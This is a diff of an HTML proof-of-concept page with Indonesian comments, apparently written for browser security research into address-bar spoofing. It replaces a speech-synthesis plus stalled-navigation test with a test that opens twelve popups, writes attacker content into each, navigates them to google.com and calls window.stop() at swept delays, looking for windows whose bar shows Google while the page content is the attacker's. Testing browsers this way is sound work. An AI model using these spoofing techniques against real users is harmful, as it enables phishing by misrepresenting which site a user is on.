@@ -1,22 +1,31 @@
-<!-- 16 | FUSI DUA KELAS - suara hidup lebih lama dari dokumennya | [1-CLICK]
-     GENOME  A=dead-port HOLD  D=S1 omnibox + permukaan AUDIO  E=TTS  F=document.write
-     MEKANISME  ini gabungan, dan itu intinya. speechSynthesis dimiliki BROWSER, bukan dokumen -
-     ia terus bicara setelah dokumen pemanggilnya ditinggalkan. Sementara itu omnibox ditahan
-     di https://www.google.com oleh navigasi yang tak pernah commit.
-     Hasilnya: pengguna MELIHAT satu origin dan MENDENGAR suara yang seolah datang dari origin itu,
-     padahal keduanya dihasilkan origin penyerang. Permukaan audio tidak punya address bar
-     sama sekali - tidak ada apa pun yang bisa membantahnya.
-     EXPECTED-SECURE  suara berhenti saat dokumen asalnya ditinggalkan, ATAU omnibox tetap jujur.
-     KELUAR  tutup tab. Teks yang diucapkan netral & menyebut dirinya PoC. -->
-<button onclick="go()">Run 16 (ada suara)</button>
-<p id=r></p>
+<!-- 16 | F1 · window.stop() ditembak TEPAT di titik commit — sapuan 12 waktu | [1-CLICK]
+     Bentuk ketiga pembatalan. Bedanya: yang membatalkan adalah KITA, dan kita memilih
+     milidetik keberapa. Kalau ada satu titik waktu di mana bar sudah berganti tapi dokumen
+     belum lahir, membunuh navigasi tepat di situ meninggalkan bar di keadaan yang salah.
+     Menembak satu waktu saja tidak berguna - commit terjadi kapan saja tergantung jaringan
+     dan cache. Jadi disapu: 0, 10, 25, 50, 75, 100, 150, 200, 300, 500, 800, 1200 ms.
+     Tiap tembakan dibuka di tabnya sendiri supaya hasilnya bisa dibandingkan berdampingan.
+     BOUNDED: 12 tab, sekali jalan. Tutup semuanya setelah dicatat.
+     YANG DICATAT  tab mana yang omniboxnya menulis TUJUAN sementara isinya masih halaman ini.
+     Kalau ada satu, itu jendelanya - dan nilai ms-nya adalah isi laporanmu.
+     EXPECTED-SECURE  semua tab: bar dan isi selalu sepakat, di titik waktu mana pun. -->
+<h2 style="font:20px system-ui">HALAMAN PENYERANG</h2>
+<button onclick="go()">Run 16 (buka 12 tab kecil)</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+var T = 'https://www.google.com/', D = [0, 10, 25, 50, 75, 100, 150, 200, 300, 500, 800, 1200];
+g.textContent = 'REAL ORIGIN: ' + location.href;
 function go() {
-  var u = new SpeechSynthesisUtterance('Ini rekaman uji riset keamanan. Suara ini berasal dari origin penyerang, bukan dari alamat yang tertulis di address bar.');
-  u.rate = 0.9; speechSynthesis.speak(u);
-  document.write('<h2>Dengarkan suaranya, lalu baca omnibox.</h2>');
-  location = 'https://www.google.com:82';
-  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
+  D.forEach(function (ms, i) {
+    setTimeout(function () {
+      var w = window.open('', '', 'width=300,height=190,left=' + (20 + (i % 6) * 310) + ',top=' + (40 + Math.floor(i / 6) * 230));
+      if (!w) return;
+      w.document.write('<div style="font:12px system-ui;padding:8px"><b>stop @ ' + ms + ' ms</b><br>isi ini milik ' + location.origin + '</div>');
+      w.location = T;
+      setTimeout(function () { try { w.stop(); } catch (e) { } }, ms);
+    }, i * 200);
+  });
+  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n12 tab dibuka, stop @ ' + D.join('/') + ' ms.' +
+    '\n\nBandingkan omnibox tiap tab dgn isinya. Cari tab yang bar-nya TUJUAN tapi isinya masih milikku.';
 }
 </script>
